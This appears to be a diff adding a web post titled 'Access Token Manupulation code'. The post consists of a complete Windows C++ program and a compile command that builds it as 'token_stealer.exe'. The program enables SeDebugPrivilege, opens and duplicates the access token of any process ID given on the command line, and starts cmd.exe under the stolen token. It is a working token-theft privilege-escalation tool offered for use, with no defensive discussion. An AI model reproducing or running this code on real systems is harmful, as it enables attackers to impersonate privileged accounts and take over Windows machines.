@@ -1,0 +1,99 @@
+<p><strong>Access Token Manupulation code </strong><br></p><pre class="prettyprint linenums">#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;string&gt; &nbsp;
+
+// Function to enable a privilege for the current process
+BOOL SetPrivilege(LPCTSTR priv) {
+&nbsp; &nbsp; HANDLE token;
+&nbsp; &nbsp; TOKEN_PRIVILEGES tp;
+&nbsp; &nbsp; LUID luid;
+
+&nbsp; &nbsp; // Retrieve LUID for the privilege
+&nbsp; &nbsp; if (!LookupPrivilegeValue(NULL, priv, &amp;luid)) {
+&nbsp; &nbsp; &nbsp; &nbsp; std::cerr &lt;&lt; "Failed to lookup privilege: " &lt;&lt; priv &lt;&lt; std::endl;
+&nbsp; &nbsp; &nbsp; &nbsp; return FALSE;
+&nbsp; &nbsp; }
+
+&nbsp; &nbsp; // Open the process token
+&nbsp; &nbsp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;token)) {
+&nbsp; &nbsp; &nbsp; &nbsp; std::cerr &lt;&lt; "Failed to open process token." &lt;&lt; std::endl;
+&nbsp; &nbsp; &nbsp; &nbsp; return FALSE;
+&nbsp; &nbsp; }
+
+&nbsp; &nbsp; // Set the privilege
+&nbsp; &nbsp; tp.PrivilegeCount = 1;
+&nbsp; &nbsp; tp.Privileges[0].Luid = luid;
+&nbsp; &nbsp; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+&nbsp; &nbsp; if (!AdjustTokenPrivileges(token, FALSE, &amp;tp, sizeof(tp), NULL, NULL)) {
+&nbsp; &nbsp; &nbsp; &nbsp; std::cerr &lt;&lt; "Failed to adjust token privileges." &lt;&lt; std::endl;
+&nbsp; &nbsp; &nbsp; &nbsp; CloseHandle(token);
+&nbsp; &nbsp; &nbsp; &nbsp; return FALSE;
+&nbsp; &nbsp; }
+
+&nbsp; &nbsp; CloseHandle(token);
+&nbsp; &nbsp; std::cout &lt;&lt; "Successfully enabled privilege: " &lt;&lt; priv &lt;&lt; std::endl;
+&nbsp; &nbsp; return TRUE;
+}
+
+// Function to get an access token from a target process
+HANDLE GetToken(DWORD pid) {
+&nbsp; &nbsp; HANDLE processHandle = (pid == 0) ? GetCurrentProcess() : OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
+&nbsp; &nbsp; if (!processHandle) {
+&nbsp; &nbsp; &nbsp; &nbsp; std::cerr &lt;&lt; "Failed to get process handle." &lt;&lt; std::endl;
+&nbsp; &nbsp; &nbsp; &nbsp; return NULL;
+&nbsp; &nbsp; }
+
+&nbsp; &nbsp; HANDLE tokenHandle;
+&nbsp; &nbsp; if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &amp;tokenHandle)) {
+&nbsp; &nbsp; &nbsp; &nbsp; std::cerr &lt;&lt; "Failed to get process token." &lt;&lt; std::endl;
+&nbsp; &nbsp; &nbsp; &nbsp; CloseHandle(processHandle);
+&nbsp; &nbsp; &nbsp; &nbsp; return NULL;
+&nbsp; &nbsp; }
+
+&nbsp; &nbsp; CloseHandle(processHandle);
+&nbsp; &nbsp; std::cout &lt;&lt; "Successfully obtained access token." &lt;&lt; std::endl;
+&nbsp; &nbsp; return tokenHandle;
+}
+
+// Function to create a new process using a stolen token
+BOOL CreateElevatedProcess(HANDLE token, LPCWSTR appPath) {
+&nbsp; &nbsp; HANDLE duplicateToken;
+&nbsp; &nbsp; STARTUPINFOW si = { sizeof(STARTUPINFOW) };
+&nbsp; &nbsp; PROCESS_INFORMATION pi = { 0 };
+
+&nbsp; &nbsp; if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;duplicateToken)) {
+&nbsp; &nbsp; &nbsp; &nbsp; std::cerr &lt;&lt; "Failed to duplicate process token." &lt;&lt; std::endl;
+&nbsp; &nbsp; &nbsp; &nbsp; return FALSE;
+&nbsp; &nbsp; }
+
+&nbsp; &nbsp; BOOL result = CreateProcessWithTokenW(duplicateToken, LOGON_WITH_PROFILE, appPath, NULL, 0, NULL, NULL, &amp;si, &amp;pi);
+&nbsp; &nbsp; if (!result) {
+&nbsp; &nbsp; &nbsp; &nbsp; std::cerr &lt;&lt; "Failed to create process." &lt;&lt; std::endl;
+&nbsp; &nbsp; } else {
+&nbsp; &nbsp; &nbsp; &nbsp; std::cout &lt;&lt; "Successfully created process: " &lt;&lt; appPath &lt;&lt; std::endl;
+&nbsp; &nbsp; }
+
+&nbsp; &nbsp; CloseHandle(duplicateToken);
+&nbsp; &nbsp; CloseHandle(pi.hProcess);
+&nbsp; &nbsp; CloseHandle(pi.hThread);
+&nbsp; &nbsp; return result;
+}
+
+int main(int argc, char** argv) {
+&nbsp; &nbsp; if (argc &lt; 2) {
+&nbsp; &nbsp; &nbsp; &nbsp; std::cerr &lt;&lt; "Usage: " &lt;&lt; argv[0] &lt;&lt; " &lt;PID&gt;" &lt;&lt; std::endl;
+&nbsp; &nbsp; &nbsp; &nbsp; return -1;
+&nbsp; &nbsp; }
+
+&nbsp; &nbsp; if (!SetPrivilege(SE_DEBUG_NAME)) return -1;
+
+&nbsp; &nbsp; DWORD pid = std::stoi(argv[1]);
+&nbsp; &nbsp; HANDLE token = GetToken(pid);
+&nbsp; &nbsp; if (!token) return -1;
+
+&nbsp; &nbsp; CreateElevatedProcess(token, L"C:\\Windows\\System32\\cmd.exe");
+&nbsp; &nbsp; CloseHandle(token);
+
+&nbsp; &nbsp; return 0;
+}</pre><p><br><strong>To compile the code</strong> <br><br><code> cl.exe /EHsc /nologo /W3 /O2 /Fe:token_stealer.exe priv.cpp /link Advapi32.lib</code> <br><br></p>
